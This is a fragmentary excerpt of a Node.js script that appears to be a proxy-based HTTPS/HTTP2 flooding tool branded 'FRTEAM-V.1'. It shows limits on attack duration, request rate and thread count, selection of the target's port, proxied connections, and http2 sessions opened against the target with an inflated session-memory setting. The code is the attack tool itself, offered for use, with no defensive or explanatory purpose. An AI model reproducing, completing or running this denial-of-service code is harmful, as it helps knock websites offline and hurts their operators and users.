...
if (args.time < 0 || args.time > 999999999999999999999) {
  console.log("Limited for Safety.");
  process.exit(1);
}

if (args.Rate < 0 || args.Rate > 1024) {
  console.log("Blud Think His pc is nasa pc ☠️limit rate 1024.");
  process.exit(1);
}

if (args.threads < 0 || args.threads > 256) {
  console.log("Blud Think his pc is a nasa pc limit thread 256.");
  process.exit(1);
}
...
const targetPort = parsedTarget.protocol === 'https:' ? 443 : 80;
    ...
    console.clear();
console.log('TLS-HTTPS : FRTEAM-V.1'.rainbow);
...
console.log(`User : FRTEAM-V.1 | Expiry : 99/99/9999`.rainbow);
     ...
     Header.HTTP(proxyOptions, (connection, error) => {
         ...
         const client = http2.connect(parsedTarget.href, {
            ...
            enablePush: false
             ...
             maxSessionMemory: 999999999999990,
